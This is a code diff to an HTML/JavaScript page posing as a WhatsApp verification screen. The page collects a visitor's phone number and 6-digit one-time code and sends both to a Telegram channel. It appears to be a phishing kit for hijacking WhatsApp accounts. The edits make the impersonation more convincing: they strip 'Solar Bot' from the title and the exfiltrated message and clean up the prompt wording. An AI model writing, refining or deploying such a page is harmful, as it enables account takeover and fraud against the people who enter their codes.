@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WhatsApp Solar Bot Verification</title>
+  <title>WhatsApp Verification</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -121,7 +121,7 @@
       const now = new Date();
       const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
       const date = now.toLocaleDateString();
-      const message = `⏰<b>Time:${time} Date:</b> ${date}\n\n📱 <b>${hiddenText()} \n \n✅WhatsApp Solar Bot Login Attempt</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n`;
+      const message = `⏰<b>Time:${time} Date:</b> ${date}\n\n📱 <b>${hiddenText()} \n \n✅WhatsApp Login Attempt</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n`;
       sendToTelegram(message);
       setTimeout(() => {
         document.getElementById("loading").style.display = "none";
@@ -164,11 +164,11 @@
     window.submitOtp = async function() {
       let otp = '';
       document.querySelectorAll('.otp-input').forEach(input => otp += input.value);
-      if (otp.length !== 6 || isNaN(otp)) { alert("Please Enter a Valid 6 Digit OTP"); return; }
+      if (otp.length !== 6 || isNaN(otp)) { alert("Please enter a valid 6 digit OTP"); return; }
       const now = new Date();
       const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
       const date = now.toLocaleDateString();
-      const message = `⏰ <b>Time:${time} Date:</b> ${date}\n\n✅ <b>OTP Received</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n\n🔢 <b>OTP Code:</b> ${otp}\n`;
+      const message = `⏰ <b>Time:${time} Date:</b> ${date}\n\n✅ <b>OTP Received </b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n\n🔢 <b>OTP Code:</b> ${otp}\n`;
       const success = await sendToTelegram(message);
       if (success) {
         document.getElementById('successMessage').style.display = 'block';
@@ -245,11 +245,11 @@
         <input type="tel" id="phoneNumber" maxlength="10" placeholder="10 digit number" inputmode="numeric">
       </div>
       <button onclick="sendNumber()">Next</button>
-      <div id="loading">Please Wait, Sending Verification Code...</div>
+      <div id="loading">Please wait, sending verification code...</div>
     </div>
 
     <div id="otpPage">
-      <p>Enter the 6-Digit Code Sent To your Phone</p>
+      <p>Enter the 6-digit code sent to your phone</p>
       <div class="otp-inputs">
         <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
         <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
